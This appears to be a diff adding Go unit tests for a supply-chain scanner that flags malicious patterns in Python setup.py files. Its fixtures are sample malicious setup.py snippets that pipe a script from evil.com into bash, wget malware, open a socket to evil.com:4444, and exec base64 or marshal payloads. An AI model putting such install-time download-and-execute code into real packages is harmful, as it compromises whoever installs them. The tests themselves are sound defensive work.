@@ -1200,3 +1200,363 @@ func TestAnalyzeScript_MatchFieldContainsEvidence(t *testing.T) {
 		}
 	}
 }
+
+// ============================================================
+// AnalyzePythonSetup Enhanced Pattern Tests
+// ============================================================
+
+// Test: AnalyzePythonSetup detects os.system() calls
+// Justification: os.system() in setup.py executes arbitrary shell commands during
+//                pip install. This is the most common attack pattern in malicious
+//                PyPI packages — used in typosquatting attacks like "python3-dateutil".
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — categorizes
+//         os.system() as a primary code execution vector in supply chain attacks
+// Methodology: Pass setup.py content with os.system() call to AnalyzePythonSetup
+// Result: Detected as HIGH severity "os.system/popen/exec" pattern
+func TestAnalyzePythonSetup_OsSystem(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import os
+
+os.system('curl https://evil.com/payload.sh | bash')
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for os.system() call")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "os.system/popen/exec" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected os.system/popen/exec pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects subprocess calls
+// Justification: subprocess module calls in setup.py spawn child processes during
+//                installation. Malicious packages use subprocess.Popen to run
+//                reverse shells or download/execute payloads.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — subprocess
+//         execution during install is a documented attack vector
+// Methodology: Pass setup.py with subprocess.call() to AnalyzePythonSetup
+// Result: Detected as HIGH severity "subprocess call" pattern
+func TestAnalyzePythonSetup_Subprocess(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import subprocess
+
+subprocess.call(['wget', 'https://evil.com/malware', '-O', '/tmp/malware'])
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for subprocess.call()")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected subprocess call pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects base64 decode
+// Justification: base64.b64decode() in setup.py is used to hide malicious payloads
+//                from casual code review. The decoded data is typically passed to
+//                exec() or os.system(). This pattern was seen in the "colourama"
+//                typosquatting attack.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — obfuscation
+//         via encoding is a documented supply chain attack technique
+// Methodology: Pass setup.py with base64.b64decode() to AnalyzePythonSetup
+// Result: Detected as HIGH severity "base64 decode" pattern
+func TestAnalyzePythonSetup_Base64Decode(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import base64
+
+payload = base64.b64decode('aW1wb3J0IG9z')
+exec(payload)
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for base64 decode + exec")
+	}
+
+	foundBase64 := false
+	foundExec := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "base64 decode" {
+			foundBase64 = true
+		}
+		if p.Pattern == "exec()" {
+			foundExec = true
+		}
+	}
+	if !foundBase64 {
+		t.Error("Expected base64 decode pattern to be detected")
+	}
+	if !foundExec {
+		t.Error("Expected exec() pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects socket connections
+// Justification: Socket connections in setup.py indicate potential reverse shells
+//                or data exfiltration channels. Legitimate packages never need raw
+//                socket access during installation.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — reverse shells
+//         via socket connections are a documented post-compromise technique
+// Methodology: Pass setup.py with socket.socket() to AnalyzePythonSetup
+// Result: Detected as HIGH severity "socket connection" pattern
+func TestAnalyzePythonSetup_SocketConnection(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('evil.com', 4444))
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for socket connection")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "socket connection" {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("Expected socket connection pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects marshal.loads (bytecode deserialization)
+// Justification: marshal.loads() deserializes Python bytecode objects which can
+//                execute arbitrary code without visible Python source. This is an
+//                advanced obfuscation technique used to hide malicious logic.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass setup.py with marshal.loads() to AnalyzePythonSetup
+// Result: Detected as HIGH severity "marshal.loads" pattern
+func TestAnalyzePythonSetup_MarshalLoads(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import marshal, types
+
+code = marshal.loads(b'\xe3\x00\x00...')
+exec(types.FunctionType(code, globals())())
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for marshal.loads()")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "marshal.loads" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected marshal.loads pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects ctypes library loading
+// Justification: ctypes.CDLL() loads native shared libraries which can execute
+//                arbitrary native code. Malicious packages can use this to load
+//                downloaded binaries during installation.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass setup.py with ctypes.CDLL() to AnalyzePythonSetup
+// Result: Detected as HIGH severity "ctypes library load" pattern
+func TestAnalyzePythonSetup_CtypesLoad(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import ctypes
+
+lib = ctypes.CDLL('/tmp/malicious.so')
+lib.exploit()
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for ctypes.CDLL()")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "ctypes library load" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected ctypes library load pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects from-import of network libraries
+// Justification: "from urllib.request import urlopen" is functionally identical
+//                to "import urllib" for supply chain risk — both enable network
+//                access during installation for data exfiltration or payload download.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020)
+// Methodology: Pass setup.py with from-import of urllib to AnalyzePythonSetup
+// Result: Detected as MEDIUM severity "network from-import" pattern
+func TestAnalyzePythonSetup_FromImportNetwork(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+from urllib.request import urlopen
+
+data = urlopen('https://evil.com/payload').read()
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for from-import of network library")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "network from-import" {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("Expected network from-import pattern to be detected")
+	}
+}
+
+// Test: AnalyzePythonSetup detects combined obfuscation attack
+// Justification: Real-world malicious setup.py files typically combine multiple
+//                techniques: base64-encoded payload + exec() + network requests.
+//                The analyzer must detect ALL patterns, not just the first one.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass setup.py with multiple attack patterns to AnalyzePythonSetup
+// Result: Multiple patterns detected, overall risk level is HIGH
+func TestAnalyzePythonSetup_CombinedAttackPatterns(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import os, base64, subprocess
+
+payload = base64.b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQ=')
+exec(payload)
+os.system('echo pwned')
+subprocess.Popen(['wget', 'https://evil.com/backdoor'])
+
+setup(
+    name='totally-legit-pkg',
+    version='1.0.0',
+    cmdclass={'install': CustomInstall},
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for combined attack")
+	}
+
+	if analysis.RiskLevel != "HIGH" {
+		t.Errorf("Expected HIGH risk level for combined attack, got %s", analysis.RiskLevel)
+	}
+
+	// Should detect at least 4 different patterns
+	if len(analysis.DangerousPatterns) < 4 {
+		t.Errorf("Expected at least 4 dangerous patterns for combined attack, got %d", len(analysis.DangerousPatterns))
+	}
+
+	// Verify specific patterns are detected
+	patternSet := make(map[string]bool)
+	for _, p := range analysis.DangerousPatterns {
+		patternSet[p.Pattern] = true
+	}
+
+	expectedPatterns := []string{"base64 decode", "exec()", "os.system/popen/exec", "cmdclass override"}
+	for _, expected := range expectedPatterns {
+		if !patternSet[expected] {
+			t.Errorf("Expected pattern %q to be detected", expected)
+		}
+	}
+}
+
+// Test: AnalyzePythonSetup does not flag legitimate setup.py with only build deps
+// Justification: Many legitimate packages use setup.py with standard setuptools
+//                patterns (install_requires, packages, etc.). These should NOT be
+//                flagged as suspicious — false positives reduce trust in the tool.
+// Source: OSSF Scorecard methodology — minimize false positives
+// Methodology: Pass a clean setup.py with only standard packaging boilerplate
+// Result: No dangerous patterns, LOW risk level
+func TestAnalyzePythonSetup_LegitimateSetupPy(t *testing.T) {
+	setupContent := `
+from setuptools import setup, find_packages
+
+with open('README.md') as f:
+    long_description = f.read()
+
+setup(
+    name='mypackage',
+    version='1.0.0',
+    description='A legitimate package',
+    long_description=long_description,
+    packages=find_packages(),
+    install_requires=[
+        'requests>=2.28.0',
+        'click>=7.0',
+    ],
+    python_requires='>=3.7',
+    classifiers=[
+        'Programming Language :: Python :: 3',
+    ],
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern)
+		}
+		t.Errorf("Expected no dangerous patterns for legitimate setup.py, got: %s", strings.Join(patterns, ", "))
+	}
+
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
+	}
+}
